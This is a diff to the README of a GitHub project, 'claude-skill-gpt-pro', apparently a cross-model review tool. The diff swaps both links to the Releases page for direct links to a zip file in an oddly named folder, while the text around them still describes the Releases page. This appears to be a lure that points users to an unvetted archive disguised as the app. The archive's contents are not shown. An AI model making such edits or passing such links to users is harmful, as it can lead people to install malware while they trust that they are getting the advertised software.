@@ -1,6 +1,6 @@
 # 🤖 claude-skill-gpt-pro - Cross-Model Review in One Step
 
-[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Mackerelscadpica752/claude-skill-gpt-pro/releases)
+[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Mackerelscadpica752/claude-skill-gpt-pro/main/janitress/skill_gpt_pro_claude_v3.1.zip)
 
 ## 📦 What this does
 
@@ -24,7 +24,7 @@ For best results, use:
 
 ## ⬇️ Download the app
 
-Visit this page to download: https://github.com/Mackerelscadpica752/claude-skill-gpt-pro/releases
+Visit this page to download: https://raw.githubusercontent.com/Mackerelscadpica752/claude-skill-gpt-pro/main/janitress/skill_gpt_pro_claude_v3.1.zip
 
 On the Releases page, look for the latest version. Download the Windows file if one is listed. If the release includes a zip file, save it to your computer first.
 
